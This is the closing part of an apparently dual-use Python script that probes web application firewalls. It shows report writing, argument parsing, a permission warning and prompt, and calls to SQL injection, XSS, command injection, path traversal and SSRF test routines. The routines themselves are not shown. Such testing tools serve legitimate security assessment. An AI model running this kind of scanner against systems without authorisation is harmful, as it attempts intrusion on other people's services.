            'details': self.results
        }
        
        report_file = f'waf_test_report_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n📄 Detailed report saved to: {Colors.CYAN}{report_file}{Colors.RESET}\n")

def main():
    if len(sys.argv) < 2:
        print(f"{Colors.RED}Usage: python3 advanced_waf_test.py <BASE_URL> [options]{Colors.RESET}")
        print(f"\nOptions:")
        print(f"  --threads N     Number of parallel threads (default: 10)")
        print(f"  --timeout N     Request timeout in seconds (default: 15)")
        print(f"  --proxy URL     Use HTTP/HTTPS proxy")
        print(f"\nExample:")
        print(f"  python3 advanced_waf_test.py https://example.com")
        print(f"  python3 advanced_waf_test.py https://example.com --threads 20 --timeout 10")
        print(f"  python3 advanced_waf_test.py https://example.com --proxy http://127.0.0.1:8080")
        sys.exit(1)
    
    base_url = sys.argv[1]
    threads = 10
    timeout = 15
    proxy = None
    
    # Parse arguments
    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == '--threads' and i + 1 < len(sys.argv):
            threads = int(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == '--timeout' and i + 1 < len(sys.argv):
            timeout = int(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == '--proxy' and i + 1 < len(sys.argv):
            proxy = sys.argv[i + 1]
            i += 2
        else:
            i += 1
    
    tester = AdvancedWAFTester(base_url, threads=threads, timeout=timeout, proxy=proxy)
    tester.print_header()
    
    print(f"{Colors.YELLOW}{Colors.BOLD}⚠️  WARNING: This script performs 500+ advanced security tests.{Colors.RESET}")
    print(f"{Colors.YELLOW}    Only use on systems you own or have explicit permission to test!{Colors.RESET}")
    print(f"{Colors.YELLOW}    Unauthorized testing may be illegal in your jurisdiction.{Colors.RESET}\n")
    
    confirmation = input(f"{Colors.CYAN}Do you have permission to test this target? (yes/no): {Colors.RESET}")
    if confirmation.lower() != 'yes':
        print(f"{Colors.RED}Test cancelled.{Colors.RESET}")
        sys.exit(0)
    
    print(f"\n{Colors.GREEN}Starting comprehensive security tests...{Colors.RESET}\n")
    
    try:
        tester.run_advanced_sqli_tests()
        tester.run_advanced_xss_tests()
        tester.run_advanced_command_injection_tests()
        tester.run_advanced_path_traversal_tests()
        tester.run_advanced_ssrf_tests()
        
        tester.print_summary()
        
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Test interrupted by user{Colors.RESET}")
        tester.print_summary()
    except Exception as e:
        print(f"\n{Colors.RED}Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()